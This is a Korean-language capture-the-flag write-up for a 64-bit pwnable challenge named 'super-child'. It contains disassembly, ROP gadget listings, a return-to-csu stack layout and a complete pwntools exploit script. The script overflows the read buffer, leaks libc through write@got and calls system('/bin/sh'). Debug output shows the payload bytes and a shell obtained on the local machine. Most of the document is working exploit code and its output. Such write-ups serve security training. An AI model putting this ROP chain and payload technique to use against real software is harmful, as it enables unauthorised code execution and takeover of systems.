# super-child

## binary

이번 문제는 `child`문제의 64-bit 문제이다

```nasm
gdb-peda$ disass main
Dump of assembler code for function main:
   0x0000000000400655 <+0>:	push   rbp
   0x0000000000400656 <+1>:	mov    rbp,rsp
   0x0000000000400659 <+4>:	sub    rsp,0x20
   0x000000000040065d <+8>:	mov    eax,0x0
   0x0000000000400662 <+13>:	call   0x400626 <init>
   0x0000000000400667 <+18>:	mov    edx,0x37
   0x000000000040066c <+23>:	mov    esi,0x400748
   0x0000000000400671 <+28>:	mov    edi,0x1
   0x0000000000400676 <+33>:	mov    eax,0x0
   0x000000000040067b <+38>:	call   0x4004e0 <write@plt>
   0x0000000000400680 <+43>:	mov    edx,0x7
   0x0000000000400685 <+48>:	mov    esi,0x40077f
   0x000000000040068a <+53>:	mov    edi,0x1
   0x000000000040068f <+58>:	mov    eax,0x0
   0x0000000000400694 <+63>:	call   0x4004e0 <write@plt>
   0x0000000000400699 <+68>:	lea    rax,[rbp-0x20]
   0x000000000040069d <+72>:	mov    edx,0x400
   0x00000000004006a2 <+77>:	mov    rsi,rax
   0x00000000004006a5 <+80>:	mov    edi,0x0
   0x00000000004006aa <+85>:	mov    eax,0x0
   0x00000000004006af <+90>:	call   0x400500 <read@plt>
   0x00000000004006b4 <+95>:	mov    eax,0x0
   0x00000000004006b9 <+100>:	leave  
   0x00000000004006ba <+101>:	ret    
End of assembler dump.
gdb-peda$
```

이번 문제에도 `read`와 `write`함수가 존재한다. 이를 통해 `libc.so.6`을 leak하고 `system`함수를 호출해 쉘을 획득하자.


```nasm
rp++ -f ./super-child -r 2 | grep "pop"    
0x0040058e: add byte [rax], al ; pop rbp ; ret  ;  (1 found)
0x00400652: nop  ; pop rbp ; ret  ;  (1 found)
0x00400588: nop dword [rax+rax+0x00000000] ; pop rbp ; ret  ;  (1 found)
0x004005d5: nop dword [rax] ; pop rbp ; ret  ;  (1 found)
0x00400587: nop word [rax+rax+0x00000000] ; pop rbp ; ret  ;  (1 found)
0x00400720: pop r14 ; pop r15 ; ret  ;  (1 found)
0x00400722: pop r15 ; ret  ;  (1 found)
0x004005f2: pop rbp ; mov byte [0x0000000000601068], 0x00000001 ; rep ret  ;  (1 found)
0x0040057f: pop rbp ; mov edi, 0x00601048 ; jmp rax ;  (1 found)
0x004005cd: pop rbp ; mov edi, 0x00601048 ; jmp rax ;  (1 found)
0x00400590: pop rbp ; ret  ;  (1 found)
0x004005d8: pop rbp ; ret  ;  (1 found)
0x00400653: pop rbp ; ret  ;  (1 found)
0x00400723: pop rdi ; ret  ;  (1 found)
0x00400721: pop rsi ; pop r15 ; ret  ;  (1 found)
```

`rdi`와 `rsi`를 `pop`하는 Gadget은 존재하지만 `edx`를 `pop`하는 가젯은 바이너리 내부에 없다. `return-to-csu`를 이용하자.

```nasm
00000000004006c0 <__libc_csu_init>:
  4006c0:	41 57                	push   r15
  4006c2:	41 56                	push   r14
  4006c4:	41 89 ff             	mov    r15d,edi
  4006c7:	41 55                	push   r13
  4006c9:	41 54                	push   r12
  4006cb:	4c 8d 25 3e 07 20 00 	lea    r12,[rip+0x20073e]        # 600e10 <__frame_dummy_init_array_entry>
  4006d2:	55                   	push   rbp
  4006d3:	48 8d 2d 3e 07 20 00 	lea    rbp,[rip+0x20073e]        # 600e18 <__init_array_end>
  4006da:	53                   	push   rbx
  4006db:	49 89 f6             	mov    r14,rsi
  4006de:	49 89 d5             	mov    r13,rdx
  4006e1:	4c 29 e5             	sub    rbp,r12
  4006e4:	48 83 ec 08          	sub    rsp,0x8
  4006e8:	48 c1 fd 03          	sar    rbp,0x3
  4006ec:	e8 bf fd ff ff       	call   4004b0 <_init>
  4006f1:	48 85 ed             	test   rbp,rbp
  4006f4:	74 20                	je     400716 <__libc_csu_init+0x56>
  4006f6:	31 db                	xor    ebx,ebx
  4006f8:	0f 1f 84 00 00 00 00 	nop    DWORD PTR [rax+rax*1+0x0]
  4006ff:	00 
  400700:	4c 89 ea             	mov    rdx,r13
  400703:	4c 89 f6             	mov    rsi,r14
  400706:	44 89 ff             	mov    edi,r15d
  400709:	41 ff 14 dc          	call   QWORD PTR [r12+rbx*8]
  40070d:	48 83 c3 01          	add    rbx,0x1
  400711:	48 39 eb             	cmp    rbx,rbp
  400714:	75 ea                	jne    400700 <__libc_csu_init+0x40>
  400716:	48 83 c4 08          	add    rsp,0x8
  40071a:	5b                   	pop    rbx
  40071b:	5d                   	pop    rbp
  40071c:	41 5c                	pop    r12
  40071e:	41 5d                	pop    r13
  400720:	41 5e                	pop    r14
  400722:	41 5f                	pop    r15
  400724:	c3                   	ret    
  400725:	90                   	nop
  400726:	66 2e 0f 1f 84 00 00 	nop    WORD PTR cs:[rax+rax*1+0x0]
  40072d:	00 00 00 
  ```

`csu1 = 0x40071a`, `csu2 = 0x400700`이다. 여기서 레지스터는 다음과 같다

```
edi = r15d = 0
rsi = r14 = write.got
rdx = r13 =  8
rbx = 0
rbp = 1
r12 = write.got
```

첫번째 스택 프레임은 다음과 같다.

Stack | Explanation
----|----
csu1 | ret of main
0 | rbx
1 | rbp
write got | r12 (call)
8 | r13	(Argv3)
write got | r14 (Argv2)
1 |	r15 (Argv1)
csu2 |	ret of csu1
dummy | rbx ~ r15 of csu2
main | ret of csu2

위 ROP Code가 실행되면 `write_got`의 값이 leak된다. 이를 이용해 다음과 같은 스택 프레임을 다시 만든다.

Stack | Explanation
----|----
pop rdi | ret of main
libc + binsh offset | Argv1
libc + system | ret of gadget
libc + exit | ret of system

`system("/bin/sh")` 이후 `exit`을 호출해 `SIGSEGV`를 피했다.

## exploit.py

```python
from pwn import *

context.log_level = 'debug'

lib = ELF('./libc.so.6')
binary = ELF('./super-child')

write_offset = lib.symbols['write']
system_offset = lib.symbols['system']
exit_offset = lib.symbols['exit']

read_plt = binary.plt['read']
read_got = binary.got['read']
write_plt = binary.plt['write']
write_got = binary.got['write']
main = binary.symbols['main']

pop_rdi = 0x00400723
pop_rsi = 0x00400721
pop_rdx_offset = 0x00001b9e


csu1 = 0x40071a
csu2 = 0x400700

payload = 'a'*0x28
# edi = r15d = 0
# rsi = r14 = write.got
# rdx = r13 =  8
# rbx = 0
# rbp = 1
# r12 = write.got

payload += p64(csu1)
payload += p64(0) + p64(1) + p64(write_got) + p64(8) + p64(write_got) + p64(1) + p64(csu2) + 'a'*8*7 + p64(main)


p = process('./super-child', env={'LD_PRELOAD' : "libc.so.6"})
#gdb.attach(proc.pidof(p)[0], 'b *main + 101')
p.recvuntil('you > \x00', timeout=1)
p.sendline(payload)
leak = p.recvn(8)
print 'leaked: ' + hex(u64(leak))
libc = u64(leak) - write_offset
print 'libc: ' + hex(libc)

payload = 'a'*0x28
payload += p64(pop_rdi) + p64(libc + list(lib.search('/bin/sh'))[0]) +  p64(system_offset + libc) + p64(exit_offset + libc)
p.sendline(payload)
p.interactive()
```

```bash
python exploit.py
[DEBUG] PLT 0x1f7f0 realloc
[DEBUG] PLT 0x1f800 __tls_get_addr
[DEBUG] PLT 0x1f820 memalign
[DEBUG] PLT 0x1f850 _dl_find_dso_for_object
[DEBUG] PLT 0x1f870 calloc
[DEBUG] PLT 0x1f8a0 malloc
[DEBUG] PLT 0x1f8a8 free
[*] '/home/ubuntu/Desktop/IGRUS/CTF_T34M/INSA/Pwnable/porb/tmp/super-child/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[DEBUG] PLT 0x4004dc write
[DEBUG] PLT 0x4004f0 setbuf
[DEBUG] PLT 0x400500 read
[DEBUG] PLT 0x400510 __libc_start_main
[DEBUG] PLT 0x400520 __gmon_start__
[*] '/home/ubuntu/Desktop/IGRUS/CTF_T34M/INSA/Pwnable/porb/tmp/super-child/super-child'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Starting local process './super-child' env={'LD_PRELOAD': 'libc.so.6'} : pid 67153
[DEBUG] Received 0x3e bytes:
    00000000  63 68 69 6c  64 20 3a 20  4e 6f 74 68  69 6e 67 20  │chil│d : │Noth│ing │
    00000010  74 6f 20 74  65 6c 6c 20  75 2c 20 4a  75 73 74 20  │to t│ell │u, J│ust │
    00000020  70 72 6f 76  65 20 75 20  61 72 65 20  6e 6f 74 20  │prov│e u │are │not │
    00000030  63 68 69 6c  64 0a 00 79  6f 75 20 3e  20 00        │chil│d··y│ou >│ ·│
    0000003e
[DEBUG] Sent 0xa9 bytes:
    00000000  61 61 61 61  61 61 61 61  61 61 61 61  61 61 61 61  │aaaa│aaaa│aaaa│aaaa│
    *
    00000020  61 61 61 61  61 61 61 61  1a 07 40 00  00 00 00 00  │aaaa│aaaa│··@·│····│
    00000030  00 00 00 00  00 00 00 00  01 00 00 00  00 00 00 00  │····│····│····│····│
    00000040  18 10 60 00  00 00 00 00  08 00 00 00  00 00 00 00  │··`·│····│····│····│
    00000050  18 10 60 00  00 00 00 00  01 00 00 00  00 00 00 00  │··`·│····│····│····│
    00000060  00 07 40 00  00 00 00 00  61 61 61 61  61 61 61 61  │··@·│····│aaaa│aaaa│
    00000070  61 61 61 61  61 61 61 61  61 61 61 61  61 61 61 61  │aaaa│aaaa│aaaa│aaaa│
    *
    000000a0  55 06 40 00  00 00 00 00  0a                        │U·@·│····│·│
    000000a9
[DEBUG] Received 0x46 bytes:
    00000000  b0 42 0a 4c  cc 7f 00 00  63 68 69 6c  64 20 3a 20  │·B·L│····│chil│d : │
    00000010  4e 6f 74 68  69 6e 67 20  74 6f 20 74  65 6c 6c 20  │Noth│ing │to t│ell │
    00000020  75 2c 20 4a  75 73 74 20  70 72 6f 76  65 20 75 20  │u, J│ust │prov│e u │
    00000030  61 72 65 20  6e 6f 74 20  63 68 69 6c  64 0a 00 79  │are │not │chil│d··y│
    00000040  6f 75 20 3e  20 00                                  │ou >│ ·│
    00000046
leaked: 0x7fcc4c0a42b0
libc: 0x7fcc4bfad000
[DEBUG] Sent 0x49 bytes:
    00000000  61 61 61 61  61 61 61 61  61 61 61 61  61 61 61 61  │aaaa│aaaa│aaaa│aaaa│
    *
    00000020  61 61 61 61  61 61 61 61  23 07 40 00  00 00 00 00  │aaaa│aaaa│#·@·│····│
    00000030  57 9d 13 4c  cc 7f 00 00  90 23 ff 4b  cc 7f 00 00  │W··L│····│·#·K│····│
    00000040  30 70 fe 4b  cc 7f 00 00  0a                        │0p·K│····│·│
    00000049
[*] Switching to interactive mode
child : Nothing to tell u, Just prove u are not child
\x00you > \x00$ id
[DEBUG] Sent 0x3 bytes:
    'id\n'
[DEBUG] Received 0x81 bytes:
    'uid=1000(ubuntu) gid=1000(ubuntu) groups=1000(ubuntu),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)\n'
uid=1000(ubuntu) gid=1000(ubuntu) groups=1000(ubuntu),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)
$ 
```